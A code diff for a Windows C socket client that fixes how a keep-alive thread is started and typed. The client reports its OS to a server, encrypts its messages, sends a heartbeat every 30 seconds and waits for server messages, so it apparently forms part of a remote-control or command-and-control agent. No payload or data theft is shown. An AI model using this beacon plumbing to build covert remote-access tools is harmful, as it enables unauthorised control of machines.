@@ -33,13 +33,14 @@ static void encrypt(char* plainText) {
     free(newString);
 }
 
-void sendKeepAlive(SOCKET clientSocket) {
+unsigned __stdcall sendKeepAlive(SOCKET* clientSocket) {
+    SOCKET clientConnection = *clientSocket;
     // Every 30 seconds, send a KEEP_ALIVE message to the server, to keep the socket open
     while (1) {
-        char keepAlive[] = "KEEP_ALIVE";
+        char keepAlive[1024] = "KEEP_ALIVE";
         encrypt(keepAlive);
         Sleep(30000);
-        send(clientSocket, keepAlive, strnlen(keepAlive, 11), 0);
+        send(clientConnection, keepAlive, strnlen(keepAlive, 11), 0);
     }
 }
 
@@ -78,9 +79,6 @@ int main(void) {
         printf("Error Code: %d\n", error);
         exit(error);
     }
-
-    int threadnum = 0;
-    SOCKET thread;
     
     // The first message sent to the Server is the OS
     const char* osMessage = "Windows\n";
@@ -130,7 +128,7 @@ int main(void) {
     freeaddrinfo(res);
 
     // Start a thread to send a keep alive message every 30 seconds to the Server
-    thread = _beginthreadex(NULL, 0, (_beginthreadex_proc_type)&sendKeepAlive, &clientSocket, 0, NULL);
+    HANDLE thread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&sendKeepAlive, &clientSocket, 0, NULL);
 
     while (1) {
         // Get message from Server
